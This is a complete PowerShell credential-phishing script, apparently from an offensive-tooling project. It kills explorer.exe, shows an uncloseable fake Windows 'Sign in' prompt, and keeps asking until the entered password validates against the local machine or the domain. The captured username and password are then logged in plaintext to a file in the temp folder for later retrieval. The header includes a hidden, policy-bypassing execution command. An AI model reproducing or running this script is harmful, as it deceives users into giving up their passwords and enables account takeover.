
<#
.SYNOPSIS
  Standalone Powershell script that will promp the current user for a valid credential.

.Author: r00t-3xp10it - (Based on @Dviros CredsLeaker poc)
  Required Dependencies: target Account Password
  Optional Dependencies: None

.DESCRIPTION
   This script will display a Windows Security Credentials box that will ask the user for his credentials.
   The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC.
   If its valid, it will leak it via one remote logfile stored on target %TMP% folder to be retrieved later.

.EXECUTION
   powershell.exe -exec bypass -w 1 -noninteractive -nologo -file "NewPhish.ps1"
 
.LINK
    https://github.com/Dviros/CredsLeaker
    https://github.com/r00t-3xp10it/meterpeter
    http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask
#>


taskkill /f /im explorer.exe
$ComputerName = $env:COMPUTERNAME
$CurrentDomain_Name = $env:USERDOMAIN


## Prerequisites
Add-Type -AssemblyName System.Runtime.WindowsRuntime
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerResults,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.AuthenticationProtocol,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerOptions,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]


## For our While loop
$status = $true

## There are 6 different authentication protocols supported.
## https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.AuthenticationProtocol = 0
$options.Caption = "Sign in"
$options.Message = "Enter your credentials"
$options.TargetName = "1"


## CredentialPicker is using Async so we will need to use Await
function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}


function Credentials(){
    while ($status){
        
        ## Where the magic happens
        $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        if (-not($creds.CredentialPassword) -or $creds.CredentialPassword -eq $null){
            Credentials
        }
        if (-not($creds.CredentialUserName)){
            Credentials
        }
        else {
            $Username = $creds.CredentialUserName;
            $Password = $creds.CredentialPassword;
            if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false -and ((Get-WmiObject -Class Win32_ComputerSystem).Workgroup -eq "WORKGROUP") -or (Get-WmiObject -Class Win32_ComputerSystem).Workgroup -ne $null){
                $domain = "WORKGROUP"
                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
                    # Leak Creds to remote logfile ($env:tmp)
                    $timestamp = Get-Date;
                    echo "" > $env:tmp\CredsPhish.log
                    echo "   Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
                    echo "   ----------------------------" >> $env:tmp\CredsPhish.log
                    echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
                    echo "   username  : $Username" >> $env:tmp\CredsPhish.log
                    echo "   password  : $Password" >> $env:tmp\CredsPhish.log
                    Start-Process -FilePath $env:windir\explorer.exe
                    $status = $false
                    exit
                    }
                else {
                    Credentials
                    }                
                }
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)
            if ($domain.name -eq $null){
                Credentials
            }
            else {
                $status = $false
                exit
            }
        }
    }
}
Credentials
